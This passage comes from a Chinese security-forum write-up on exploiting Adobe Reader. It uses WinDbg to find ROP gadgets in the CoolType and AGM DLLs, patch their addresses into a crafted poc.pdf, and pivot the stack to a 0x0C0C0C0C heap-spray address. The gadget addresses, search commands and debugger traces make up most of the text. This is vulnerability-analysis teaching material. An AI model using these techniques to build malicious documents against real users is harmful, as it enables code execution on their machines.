
成功定位到了流程被劫持的位置。

## 7.4 跳板指令的确定

接下来需要在生成数据中搜索`0xa5e1a5e2`，并把它替换成跳板指令所在的地址，但是跳板指令是什么呢？

我们的目标是通过`pop retn`让`0x0C0C0C0C`成为栈顶，然后继续ROP的执行

需要看一下寄存器的值，上面已经贴出了：

```
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718  eip=e2a5e1a5 esp=0012dd24 ebp=0012dd48 iopl=0         nv up ei pl nz na po nc  cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202
```

目前可控数据所处的地址范围是`0x12e4d8~0x12e71c`，

最理想的情况就是让`esp`加上一定的值（这里是`0x7B4~0x9F8`），到达可控数据范围，然后`pop esp`修改`esp`为`0x0c0c0c0c`，再加一个`retn`

`pop esp retn`指令很好找(寻找的范围是Adobe Reader中一个DLL文件的加载地址)：

```
0:000> a  4a80b69b pop esp  pop esp  4a80b69c retn  retn  4a80b69d
0:000> s 06000000 L3000000 5c c3
0:000> uf 060280c7
AGM!AGMInitialize+0x1a4f3:
060280c7 5c              pop     esp
060280c8 c3              ret
```

但是想在前面再加上一个`add esp`指令就不好找了，这也是为什么`msf`的代码中使用的使用`add ebp + leave retn`的模式，先对`ebp`进行计算，然后通过`leave`指令将其移动到`esp`中。

如果是对`ebp`进行加法，可能的范围就是`0x790~0x9D4`，不知道`0x794`这个数值是不是实验出来的，按照四字节对齐，第二次就是实验出来：

```
0:000> s 06000000 L3000000 81 c5 90 07 00 00 c9 c3
0:000> s 06000000 L3000000 81 c5 94 07 00 00 c9 c3
081586a5  81 c5 94 07 00 00 c9 c3 -55 8b ec 83 ec 1c 53 56  ........U.....SV
0:000> uf 081586a5
CoolType!CTCleanup+0x9ddb:
081586a5 81c594070000    add     ebp,794h
081586ab c9              leave
081586ac c3              ret
```

## 7.5 跳板指令位置的确定

第一个跳板指令是`add ebp + leave retn`，把它的地址`081586a5`放到`0xa5e1a5e2`的位置，然后还是上述步骤调试，发现已经可以正常跳转到`add ebp, 794h`了：

```
0:000> g
Breakpoint 1 hit
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718  eip=0808b308 esp=0012dd28 ebp=0012dd48 iopl=0         nv up ei pl nz na po nc  cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
CoolType!CTInit+0x44c65:
0808b308 ff10            call    dword ptr [eax]      ds:0023:0012e6d0=081586a5
0:000> t
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718  eip=081586a5 esp=0012dd24 ebp=0012dd48 iopl=0         nv up ei pl nz na po nc  cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
CoolType!CTCleanup+0x9ddb:
081586a5 81c594070000    add     ebp,794h
```

`ebp+0x794=0x12e4dc`，`leave`指令相当于`mov esp, ebp; pop ebp`，因此`leave`指令之后，`esp`的数值应该是`0x12e4dc+4=0x12e4e0`，此时再执行`retn`，就会在`0x12e4e0`处的数值移入`EIP`中。

在`Windbg`中查看：

```
0:000> p
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718  eip=081586ac esp=0012e4e0 ebp=a4a1a3a1 iopl=0         nv up ei pl nz na po nc  cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
CoolType!CTCleanup+0x9de2:
081586ac c3              ret
0:000> dd esp l1
0012e4e0  a6a1a5a1
```

这里的数据是`a6a1a5a1`。因此在生成数据中搜索`0xa1a5a1a6`，并将其替换为指令`pop esp retn`的地址`060280c7`。

在执行`pop esp`之前，由于前面的`retn`指令，此时`esp`应该指向`0x12e4e4`，因此要把这里的数据修改成`0x0C0C0C0C`。

全部修改完毕后，还是按照之前的步骤，形成`poc.pdf`，然后用`Windbg`调试，最后到达了`0x0c0c0c0c`位置，按照ROP的流程继续往下执行：

```
0:000> p
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718  eip=060280c7 esp=0012e4e4 ebp=a4a1a3a1 iopl=0         nv up ei pl nz na po nc  cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
AGM!AGMInitialize+0x1a4f3:
060280c7 5c              pop     esp
0:000> p
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718  eip=060280c8 esp=0c0c0c0c ebp=a4a1a3a1 iopl=0         nv up ei pl nz na po nc  cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
AGM!AGMInitialize+0x1a4f4:
060280c8 c3              ret
```

注意此时`esp`已经是`0x0c0c0c0c`了。

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-2-8 18:56

被`zzephyr`编辑，原因： 更新了一部分内容

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)
